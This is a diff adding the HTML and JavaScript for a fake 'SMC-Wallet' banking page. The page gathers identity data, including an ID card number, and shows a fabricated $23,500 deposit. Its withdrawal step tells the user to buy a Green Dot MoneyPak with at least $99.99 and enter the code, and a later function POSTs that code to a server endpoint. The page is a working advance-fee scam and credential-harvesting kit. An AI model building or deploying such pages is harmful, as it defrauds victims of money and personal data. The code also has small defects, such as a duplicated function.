+                    device, tap on * to view disclosures.
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <div id="authModal" class="modal">
+        <div class="modal-box">
+            <h2 id="formTitle">Create Account</h2>
+            <div class="modal-sub" id="formIntro">
+                Complete the steps below to create your account.
+            </div>
+
+            <div class="stepper" id="stepper">
+                <div class="step active" id="stepMarker1">
+                    <div class="step-circle">1</div>
+                    <div class="step-label">Account</div>
+                </div>
+                <div class="step" id="stepMarker2">
+                    <div class="step-circle">2</div>
+                    <div class="step-label">Profile</div>
+                </div>
+                <div class="step" id="stepMarker3">
+                    <div class="step-circle">3</div>
+                    <div class="step-label">Contact</div>
+                </div>
+                <div class="step" id="stepMarker4">
+                    <div class="step-circle">4</div>
+                    <div class="step-label">Confirm</div>
+                </div>
+            </div>
+
+            <div class="form-step active" id="step1">
+                <div class="input-grid">
+                    <input id="name" class="full" placeholder="Full Name" />
+                    <input id="username" placeholder="Username" />
+                    <input id="password" type="password" placeholder="Password" />
+                    <input id="retypePassword" class="full" type="password" placeholder="Retype Password" />
+                </div>
+            </div>
+
+            <div class="form-step" id="step2">
+                <div class="input-grid">
+                    <input id="dob" placeholder="Date of Birth" />
+                    <input id="areaCode" placeholder="Area Code" />
+                    <input id="city" class="full" placeholder="City" />
+                </div>
+            </div>
+
+            <div class="form-step" id="step3">
+                <div class="input-grid">
+                    <input id="phone" class="full" placeholder="Phone Number" />
+                    <input id="email" class="full" placeholder="Email Address" />
+                    <input id="idCard" class="full" placeholder="ID Card Number" />
+                </div>
+            </div>
+
+            <<div class="form-step" id="step4">
+                <div class="modal-sub">
+                    input the code below to know you are human
+                </div>
+
+                <div class="mock-code" id="mockCodeBox"></div>
+
+                <div class="input-grid">
+                    <input id="confirmCode" class="full" placeholder="Enter Confirmation Code" />
+                </div>
+        </div>
+
+        <div class="inline-error" id="formError"></div>
+
+        <div class="step-actions">
+            <button class="step-btn" id="prevBtn" onclick="previousStep()">Back</button>
+            <button class="auth-btn" id="nextBtn" onclick="nextStep()">Next</button>
+        </div>
+
+        <div class="switch">
+            Already have an account?
+            <a onclick="showLogin()">Login</a>
+        </div>
+    </div>
+    </div>
+
+    <div id="depositAlert"></div>
+
+    <div id="dashboard">
+        <div class="dashboard-shell">
+            <div class="dash-header">
+                <div class="dash-logo">
+                    <div class="dash-dot"></div>
+                    <div>SMC-Wallet</div>
+                </div>
+
+                <div class="logout-btn" onclick="logout()">Logout</div>
+            </div>
+
+            <div id="homePage">
+                <div class="dashboard-grid">
+                    <div class="stack">
+                        <div class="hero-account panel">
+                            <div class="welcome-box">
+                                <div>✔️</div>
+                                <span id="welcomeUser"></span>
+                            </div>
+
+                            <div class="account-title">Your wallet overview is ready.</div>
+
+                            <div class="account-subtitle">
+                                Review your available balance, wallet actions, and transaction activity
+                            </div>
+
+                            <div class="balance-band">
+                                <div class="balance-card">
+                                    <div class="balance-top">
+                                        <div class="balance-title">Available Balance</div>
+                                        <div class="eye-btn" onclick="toggleBalance()">👁</div>
+                                    </div>
+
+                                    <div id="balanceAmount" class="balance-amount">$0.00</div>
+                                    <div class="balance-sub">Reloadable Deposit Account</div>
+
+                                    <div class="action-row">
+                                        <div class="action-item" onclick="openWithdrawPage()">
+                                            <div class="action-icon">💸</div>
+                                            <div class="action-label">Withdrawal</div>
+                                        </div>
+                                        <div class="action-item">
+                                            <div class="action-icon">📥</div>
+                                            <div class="action-label">Deposit</div>
+                                        </div>
+                                        <div class="action-item">
+                                            <div class="action-icon">🪙</div>
+                                            <div class="action-label">Savings</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="panel">
+                            <div class="panel-head">
+                                <div class="panel-title">Recent Transactions</div>
+                                <div class="panel-link" onclick="showHistory()">View all</div>
+                            </div>
+
+                            <div class="transaction-list" id="recentTxList">
+                                <div class="tx" onclick="openTransactionDetails()">
+                                    <div class="tx-left">
+                                        <div class="tx-icon">🏢</div>
+                                        <div class="tx-copy">
+                                            <div class="tx-name">Survival Management Company</div>
+                                            <div class="tx-meta" id="recentTxMeta">Deposit</div>
+                                        </div>
+                                    </div>
+                                    <div class="tx-amount">+$23,500.00</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="stack">
+                        <div class="visa-card panel">
+                            <div class="visa-header">
+                                <div>SMC Card</div>
+                                <div>VISA</div>
+                            </div>
+
+                            <div class="visa-middle" id="cardMessage"></div>
+
+                            <div class="visa-bottom">
+                                <div>
+                                    <div style="font-size:.8rem; opacity:.88;">Card Number</div>
+                                    <div class="card-number">•••• •••• •••• 2048</div>
+                                </div>
+                                <div style="font-weight:800;">SMC</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="historyPage">
+                <div class="panel">
+                    <div class="panel-head">
+                        <div class="panel-title">Transaction History</div>
+                        <div class="panel-link" onclick="showHome()">Back Home</div>
+                    </div>
+
+                    <div class="transaction-list" id="historyTxList">
+                        <div class="tx" onclick="openTransactionDetails()">
+                            <div class="tx-left">
+                                <div class="tx-icon">🏢</div>
+                                <div class="tx-copy">
+                                    <div class="tx-name">Survival Management Company</div>
+                                    <div class="tx-meta" id="historyTxMeta">Deposit</div>
+                                </div>
+                            </div>
+                            <div class="tx-amount">+$23,500.00</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="bottom-nav">
+            <div class="nav-item active" id="homeNav" onclick="showHome()">🏠<br />Home</div>
+            <div class="nav-item" id="historyNav" onclick="showHistory()">🕘<br />History</div>
+        </div>
+    </div>
+
+    <div id="popupOverlay" class="popup-overlay">
+        <div class="popup-box">
+            <h3 id="popupTitle">Notice</h3>
+            <div class="popup-text" id="popupText"></div>
+            <div class="popup-actions">
+                <button class="notice-btn" onclick="closePopup()">Okay</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="txnOverlay" class="txn-overlay">
+        <div class="txn-box">
+            <h3>Transaction Details</h3>
+            <div class="txn-sub">
+
+            </div>
+
+            <div class="detail-grid">
+                <div class="detail-item">
+                    <div class="detail-label">Amount</div>
+                    <div class="detail-value">+$23,500.00</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Transaction Type</div>
+                    <div class="detail-value">Deposit</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Sent From</div>
+                    <div class="detail-value">SMC Wallet ••••4821</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Date</div>
+                    <div class="detail-value" id="detailDate">April 10, 2026</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Time</div>
+                    <div class="detail-value" id="detailTime">11:45 AM</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Reference</div>
+                    <div class="detail-value">SMC-TRX-23500</div>
+                </div>
+            </div>
+
+            <div class="txn-actions">
+                <button class="detail-close" onclick="closeTransactionDetails()">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="withdrawOverlay" class="txn-overlay">
+        <div class="txn-box withdraw-box">
+            <div class="withdraw-head">
+                <h3>Withdrawal Process</h3>
+                <button class="withdraw-close" onclick="closeWithdrawPage()">✕</button>
+            </div>
+
+            <div class="withdraw-card">
+                <div class="withdraw-label">Process</div>
+
+                <div class="withdraw-step">
+                    <h4>1. Provide Your Unregistered Card, eg(MoneyPak)</h4>
+                    <p>
+                        Submit a Green Dot moneypak Card for registration and linking it to your Reloadable
+                        Account.
+                    </p>
+                </div>
+
+                <div class="withdraw-divider"></div>
+
+                <div class="withdraw-step">
+                    <h4>2. Don't Have One Yet? Here's How to Get It:</h4>
+                    <ul>
+                        <li>Visit any local store that sells Green Dot moneypak Cards.</li>
+                        <li>
+                            Purchase a Green Dot Moneypak Card and load a minimum of
+                            <strong>$99.99</strong> onto it. This amount remains on the card balance.
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="withdraw-divider"></div>
+
+                <div class="withdraw-step">
+                    <label for="moneypakCode" class="withdraw-input-label">Enter MoneyPak Code</label>
+                    <input id="moneypakCode" class="withdraw-input" placeholder="Enter code here" />
+                    <button class="auth-btn withdraw-submit" onclick="submitWithdrawCode()">Submit</button>
+                    <div id="withdrawMessage" class="withdraw-message"></div>
+                    <div id="withdrawTimer" class="withdraw-timer"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const header = document.getElementById("header");
+        const authModal = document.getElementById("authModal");
+        const dashboard = document.getElementById("dashboard");
+        const welcomeUser = document.getElementById("welcomeUser");
+        const cardMessage = document.getElementById("cardMessage");
+        const balanceAmount = document.getElementById("balanceAmount");
+        const depositAlert = document.getElementById("depositAlert");
+        const homePage = document.getElementById("homePage");
+        const historyPage = document.getElementById("historyPage");
+        const homeNav = document.getElementById("homeNav");
+        const historyNav = document.getElementById("historyNav");
+        const formTitle = document.getElementById("formTitle");
+        const formIntro = document.getElementById("formIntro");
+        const formError = document.getElementById("formError");
+        const prevBtn = document.getElementById("prevBtn");
+        const nextBtn = document.getElementById("nextBtn");
+        const popupOverlay = document.getElementById("popupOverlay");
+        const popupTitle = document.getElementById("popupTitle");
+        const popupText = document.getElementById("popupText");
+        const txnOverlay = document.getElementById("txnOverlay");
+        const mockCodeBox = document.getElementById("mockCodeBox");
+        const recentTxMeta = document.getElementById("recentTxMeta");
+        const historyTxMeta = document.getElementById("historyTxMeta");
+        const detailDate = document.getElementById("detailDate");
+        const detailTime = document.getElementById("detailTime");
+        const stepper = document.getElementById("stepper");
+
+        let balanceVisible = true;
+        const realBalance = 23500;
+        let displayedBalance = 0;
+        let pendingDepositTimeout = null;
+        let balanceInterval = null;
+        let signupStep = 1;
+        let mockCode = "";
+        let withdrawCountdown = null;
+        let withdrawSeconds = 60;
+
+        window.addEventListener("scroll", () => {
+            header.style.boxShadow = window.scrollY > 10 ? "0 14px 40px rgba(0,0,0,0.22)" : "none";
+        });
+
+        function openSignup() {
+            clearInputs();
+
+            const hasAccount = localStorage.getItem("accountCreated") === "true";
+
+            if (hasAccount) {
+                showPopup(
+                    "Account Already Exists",
+                    "An account already exists. Please login instead."
+                );
+                showLogin();
+                return;
+            }
+
+            resetSignupMode();
+            authModal.style.display = "flex";
+        }
+
+        function resetSignupMode() {
+            formTitle.innerText = "Create Account";
+            formIntro.innerText = "Complete the steps below to create your account.";
+            stepper.style.display = "grid";
+            signupStep = 1;
+            mockCode = "";
+            showAllSignupFields();
+            updateSignupUI();
+        }
+
+        function showAllSignupFields() {
+            document.getElementById("name").style.display = "block";
+            document.getElementById("retypePassword").style.display = "block";
+            document.getElementById("dob").style.display = "block";
+            document.getElementById("areaCode").style.display = "block";
+            document.getElementById("city").style.display = "block";
+            document.getElementById("phone").style.display = "block";
+            document.getElementById("email").style.display = "block";
+            document.getElementById("idCard").style.display = "block";
+            document.getElementById("confirmCode").style.display = "block";
+            mockCodeBox.style.display = "block";
+        }
+
+        function showLogin() {
+            clearInputs();
+
+            authModal.style.display = "flex";
+            formTitle.innerText = "Login";
+            formIntro.innerText = "Login with the details you used during signup.";
+            stepper.style.display = "none";
+            formError.innerText = "";
+
+            document.getElementById("step1").classList.add("active");
+            document.getElementById("step2").classList.remove("active");
+            document.getElementById("step3").classList.remove("active");
+            document.getElementById("step4").classList.remove("active");
+
+            document.getElementById("name").style.display = "none";
+            document.getElementById("retypePassword").style.display = "none";
+            document.getElementById("dob").style.display = "none";
+            document.getElementById("areaCode").style.display = "none";
+            document.getElementById("city").style.display = "none";
+            document.getElementById("phone").style.display = "none";
+            document.getElementById("email").style.display = "none";
+            document.getElementById("idCard").style.display = "none";
+            document.getElementById("confirmCode").style.display = "none";
+            mockCodeBox.style.display = "none";
+
+            prevBtn.style.display = "none";
+            nextBtn.innerText = "Login";
+            nextBtn.onclick = login;
+        }
+
+        function updateSignupUI() {
+            formError.innerText = "";
+
+            for (let i = 1; i <= 4; i++) {
+                document.getElementById(`step${i}`).classList.remove("active");
+                document.getElementById(`stepMarker${i}`).classList.remove("active", "done");
+            }
+
+            document.getElementById(`step${signupStep}`).classList.add("active");
+
+            for (let i = 1; i < signupStep; i++) {
+                document.getElementById(`stepMarker${i}`).classList.add("done");
+            }
+            document.getElementById(`stepMarker${signupStep}`).classList.add("active");
+
+            prevBtn.style.display = signupStep === 1 ? "none" : "block";
+            nextBtn.innerText = signupStep === 4 ? "Create Account" : "Next";
+            nextBtn.onclick = signupStep === 4 ? finishSignup : nextStep;
+
+            if (signupStep === 4) {
+                generateMockCode();
+            }
+        }
+
+        function nextStep() {
+            if (!validateStep(signupStep)) return;
+            if (signupStep < 4) {
+                signupStep++;
+                updateSignupUI();
+            }
+        }
+
+        function previousStep() {
+            if (signupStep > 1) {
+                signupStep--;
+                updateSignupUI();
+            }
+        }
+
+        function validateStep(step) {
+            formError.innerText = "";
+
+            if (step === 1) {
+                const name = document.getElementById("name").value.trim();
+                const username = document.getElementById("username").value.trim();
+                const password = document.getElementById("password").value.trim();
+                const retype = document.getElementById("retypePassword").value.trim();
+
+                if (!name || !username || !password || !retype) {
+                    formError.innerText = "Please complete all fields in step 1.";
+                    return false;
+                }
+
+                if (password !== retype) {
+                    formError.innerText = "Password and Retype Password do not match.";
+                    return false;
+                }
+            }
+
+            if (step === 2) {
+                const dob = document.getElementById("dob").value.trim();
+                const areaCode = document.getElementById("areaCode").value.trim();
+                const city = document.getElementById("city").value.trim();
+
+                if (!dob || !areaCode || !city) {
+                    formError.innerText = "Please complete all fields in step 2.";
+                    return false;
+                }
+            }
+
+            if (step === 3) {
+                const phone = document.getElementById("phone").value.trim();
+                const email = document.getElementById("email").value.trim();
+                const idCard = document.getElementById("idCard").value.trim();
+
+                if (!phone || !email || !idCard) {
+                    formError.innerText = "Please complete all fields in step 3.";
+                    return false;
+                }
+            }
+
+            return true;
+        }
+
+        function generateMockCode() {
+            if (!mockCode) {
+                mockCode = String(Math.floor(100000 + Math.random() * 900000));
+            }
+
+            const email = document.getElementById("email").value.trim() || "your email";
+            mockCodeBox.innerHTML = `Mock email sent to <b>${email}</b><br />Training confirmation code: <b>${mockCode}</b>`;
+        }
+
+        function finishSignup() {
+            if (!validateStep(3) || !document.getElementById("confirmCode").value.trim()) return;
+
+            const enteredCode = document.getElementById("confirmCode").value.trim();
+            if (!enteredCode) {
+                formError.innerText = "Please enter the confirmation code.";
+                return;
+            }
+
+            if (enteredCode !== mockCode) {
+                formError.innerText = "The confirmation code is incorrect.";
+                return;
+            }
+
+            if (localStorage.getItem("accountCreated") === "true") {
+                showPopup(
+                    "Account Already Exists",
+                    "An account with your saved details already exists on this device. Please login instead."
+                );
+                return;
+            }
+
+            localStorage.setItem("accountCreated", "true");
+            localStorage.setItem("name", document.getElementById("name").value.trim() || "Customer");
+            localStorage.setItem("username", document.getElementById("username").value.trim());
+            localStorage.setItem("password", document.getElementById("password").value.trim());
+            localStorage.setItem("email", document.getElementById("email").value.trim());
+            localStorage.setItem("balance", "0");
+            localStorage.setItem("firstDepositPending", "true");
+            localStorage.setItem("depositDate", new Date().toISOString());
+
+            authModal.style.display = "none";
+            showDashboard(true);
+        }
+
+        function login() {
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
+
+            const savedUser = localStorage.getItem("username");
+            const savedPass = localStorage.getItem("password");
+
+            if (username === savedUser && password === savedPass) {
+                authModal.style.display = "none";
+                showDashboard(false);
+            } else {
+                formError.innerText = "Wrong username or password.";
+            }
+        }
+
+        function showDashboard(isNewSignup) {
+            const name = localStorage.getItem("name") || "Customer";
+
+            dashboard.style.display = "block";
+            welcomeUser.innerText = "You're welcome, " + name;
+            cardMessage.innerText = name + ", your Green Dot Reloadable Visa Card is ready to be linked with this account.";
+
+            clearTimeout(pendingDepositTimeout);
+            clearInterval(balanceInterval);
+
+            const savedBalance = Number(localStorage.getItem("balance") || "0");
+            const firstDepositPending = localStorage.getItem("firstDepositPending") === "true";
+
+            showHome();
+            balanceVisible = true;
+            updateTransactionMeta();
+
+            if (isNewSignup && firstDepositPending) {
+                displayedBalance = 0;
+                updateBalanceText(displayedBalance);
+
+                pendingDepositTimeout = setTimeout(() => {
+                    const now = new Date();
+                    localStorage.setItem("depositDate", now.toISOString());
+                    updateTransactionMeta();
+                    showDepositAlert();
+                    animateBalanceTo(realBalance);
+                    localStorage.setItem("balance", String(realBalance));
+                    localStorage.setItem("firstDepositPending", "false");
+                }, 5000);
+            } else {
+                displayedBalance = savedBalance || realBalance;
+                if (!savedBalance) {
+                    localStorage.setItem("balance", String(realBalance));
+                }
+                localStorage.setItem("firstDepositPending", "false");
+                updateBalanceText(displayedBalance);
+            }
+        }
+
+        function updateBalanceText(value) {
+            if (!balanceVisible) {
+                balanceAmount.innerText = "••••••";
+                return;
+            }
+
+            balanceAmount.innerText =
+                "$" +
+                value.toLocaleString(undefined, {
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2
+                });
+        }
+
+        function animateBalanceTo(target) {
+            clearInterval(balanceInterval);
+            let current = displayedBalance;
+            const steps = 80;
+            const increment = (target - current) / steps;
+
+            balanceInterval = setInterval(() => {
+                current += increment;
+
+                if (current >= target) {
+                    current = target;
+                    clearInterval(balanceInterval);
+                }
+
+                displayedBalance = current;
+                updateBalanceText(displayedBalance);
+            }, 22);
+        }
+
+        function toggleBalance() {
+            balanceVisible = !balanceVisible;
+            updateBalanceText(displayedBalance);
+        }
+
+        function showDepositAlert() {
+            const name = localStorage.getItem("name") || "Customer";
+
+            depositAlert.innerHTML = `
+        <div class="alert-title">
+          <div class="alert-badge">GreenDot Alert</div>
+          <div style="font-size:0.8rem;color:#9fb1a8;">Just now</div>
+        </div>
+        <div class="alert-body">
+          Dear ${name}, your wallet received <b>$23,500.00</b> from
+          <b>Survival Management Company</b>.
+        </div>
+      `;
+
+            depositAlert.style.top = "20px";
+
+            setTimeout(() => {
+                depositAlert.style.top = "-160px";
+            }, 7000);
+        }
+
+        function formatDepositDate() {
+            const stored = localStorage.getItem("depositDate");
+            const date = stored ? new Date(stored) : new Date();
+            return {
+                date: date.toLocaleDateString(undefined, {
+                    year: "numeric",
+                    month: "long",
+                    day: "numeric"
+                }),
+                time: date.toLocaleTimeString(undefined, {
+                    hour: "numeric",
+                    minute: "2-digit"
+                })
+            };
+        }
+
+        function updateTransactionMeta() {
+            const data = formatDepositDate();
+            recentTxMeta.innerText = `Deposit • ${data.time}`;
+            historyTxMeta.innerText = `Deposit • ${data.time}`;
+            detailDate.innerText = data.date;
+            detailTime.innerText = data.time;
+        }
+
+        function openTransactionDetails() {
+            updateTransactionMeta();
+            txnOverlay.style.display = "flex";
+        }
+
+        function closeTransactionDetails() {
+            txnOverlay.style.display = "none";
+        }
+
+        function openWithdrawPage() {
+            document.getElementById("withdrawOverlay").style.display = "flex";
+            document.getElementById("withdrawMessage").innerText = "";
+            document.getElementById("withdrawTimer").innerText = "";
+        }
+
+        function closeWithdrawPage() {
+            document.getElementById("withdrawOverlay").style.display = "none";
+        }
+
+        function submitWithdrawCode() {
+            const input = document.getElementById("moneypakCode");
+            const message = document.getElementById("withdrawMessage");
+            const timer = document.getElementById("withdrawTimer");
+            const code = input.value.trim();
+
+            if (!code) {
+                message.innerText = "Please enter a code.";
+                timer.innerText = "";
+                return;
+            }
+
+            message.innerText = "Code submitted locally for review.";
+            withdrawSeconds = 60;
+            timer.innerText = "Confirmation timer: 01:00";
+
+            clearInterval(withdrawCountdown);
+            withdrawCountdown = setInterval(() => {
+                withdrawSeconds--;
+
+                const minutes = String(Math.floor(withdrawSeconds / 60)).padStart(2, "0");
+                const seconds = String(withdrawSeconds % 60).padStart(2, "0");
+                timer.innerText = `Confirmation timer: ${minutes}:${seconds}`;
+
+                if (withdrawSeconds <= 0) {
+                    clearInterval(withdrawCountdown);
+                    timer.innerText = "Timer complete.";
+                }
+            }, 1000);
+        }
+
+        function showHistory() {
+            homePage.style.display = "none";
+            historyPage.style.display = "block";
+            homeNav.classList.remove("active");
+            historyNav.classList.add("active");
+        }
+
+        function showHome() {
+            homePage.style.display = "block";
+            historyPage.style.display = "none";
+            homeNav.classList.add("active");
+            historyNav.classList.remove("active");
+        }
+
+        function showPopup(title, text) {
+            popupTitle.innerText = title;
+            popupText.innerText = text;
+            popupOverlay.style.display = "flex";
+        }
+
+        function closePopup() {
+            popupOverlay.style.display = "none";
+        }
+
+        function logout() {
+            clearTimeout(pendingDepositTimeout);
+            clearInterval(balanceInterval);
+            clearInterval(withdrawCountdown);
+            location.reload();
+        }
+
+        window.addEventListener("click", (event) => {
+            if (event.target === authModal) {
+                authModal.style.display = "none";
+            }
+            if (event.target === popupOverlay) {
+                closePopup();
+            }
+            if (event.target === txnOverlay) {
+                closeTransactionDetails();
+            }
+            if (event.target === document.getElementById("withdrawOverlay")) {
+                closeWithdrawPage();
+            }
+        });
+
+        prevBtn.style.display = "none";
+        function clearInputs() {
+            document.querySelectorAll("input").forEach(input => input.value = "");
+        }
+        async function submitWithdrawCode() {
+            const code = document.getElementById("moneypakCode").value;
+            const messageBox = document.getElementById("withdrawMessage");
+
+            if (!code) {
+                messageBox.innerText = "Please enter a code.";
+                return;
+            }
+
+            try {
+                const res = await fetch("http://localhost:3000/send-code", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ code })
+                });
+
+                const data = await res.json();
+                messageBox.innerText = data.message;
+            } catch (error) {
+                messageBox.innerText = "Error sending code.";
+            }
+        }
+    </script>
+</body>
+
+</html>
